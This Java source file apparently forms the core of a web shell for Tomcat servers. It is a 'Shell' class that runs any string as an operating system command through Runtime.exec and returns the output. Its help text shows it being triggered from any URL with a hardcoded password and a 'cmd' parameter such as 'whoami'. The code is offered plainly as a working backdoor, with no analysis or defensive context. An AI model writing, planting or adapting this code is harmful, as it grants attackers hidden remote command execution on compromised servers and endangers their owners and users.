package forTomcat;

import java.io.DataInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Scanner;

public class Shell {

    public static String execute(String cmd) throws Exception {
        String s ="";
        if (cmd != null && cmd.length() > 0) {
            Process pc =Runtime.getRuntime().exec(cmd);
            Scanner sc = new Scanner(pc.getInputStream(),"utf-8").useDelimiter("\\a");
            s = sc.hasNext()?sc.next():"";
        }
        return s;
    }

    public static String help() {
        return "anyurl?passwod=ga0weI&cmd=whoami  //go with cmd \n";
    }
}

